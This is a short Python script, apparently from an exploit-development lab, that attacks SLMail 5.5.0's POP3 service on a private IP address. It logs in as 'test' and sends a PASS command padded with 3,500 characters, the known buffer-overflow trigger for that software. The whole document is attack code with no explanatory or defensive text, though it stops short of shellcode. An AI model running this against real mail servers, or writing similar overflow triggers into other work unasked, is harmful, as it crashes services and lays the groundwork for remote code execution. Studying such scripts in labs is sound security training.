#!/usr/bin/python
import socket
import struct

#USED FOR SLMAIL 5.5.0
#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

s.recv(1024)

buf = ""
buf += "Z"*3500
buf += "\n"

#send the message
s.send('USER test \r\n')

s.recv(1024)

s.send('PASS ' + buf + '\r\n')

s.recv(1024)

s.send('QUIT\r\n')

s.close()
